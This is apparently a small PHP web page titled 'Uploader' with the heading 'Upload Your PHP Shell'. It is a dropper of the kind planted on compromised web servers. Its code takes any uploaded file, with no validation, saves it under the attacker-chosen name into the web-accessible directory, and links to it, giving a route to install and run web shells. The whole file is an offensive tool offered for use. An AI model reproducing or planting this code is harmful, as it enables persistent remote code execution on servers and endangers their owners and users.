<html>
<title>Uploader</title>
<body text="#FF0000" bgcolor="#000000">

<div align="center">

  
  <font face="Arial" color="#FFFFFF">
<br>  <b><h1>Upload Your PHP Shell</h1></b><br>
  </font>
</div>
<form name="uplform" method="post" action="<?=$PHP_SELF?>" enctype="multipart/form-data">
  <div align="center">
  <input type="file" name="userfile">
  <input type="submit">
  </div>
</form>
<hr>
<div align="center">
  <font face="Arial" color="red">
  <?
$uploaddir = './';
$uploadfile = $uploaddir . basename($_FILES['userfile']['name']);
if ( isset($_FILES["userfile"]) ) {
    echo "Uploaded Successfully -  ";
    if (move_uploaded_file
($_FILES["userfile"]["tmp_name"], $uploadfile))
echo "<a href='$uploadfile'>Click Here</a>";
    else echo "Failed";
}

?>
  </font>
  </div>
<hr align="center">
<div align="center">
<img src="http://i.imgur.com/3GqsquD.png">
</div>
</body>
</html>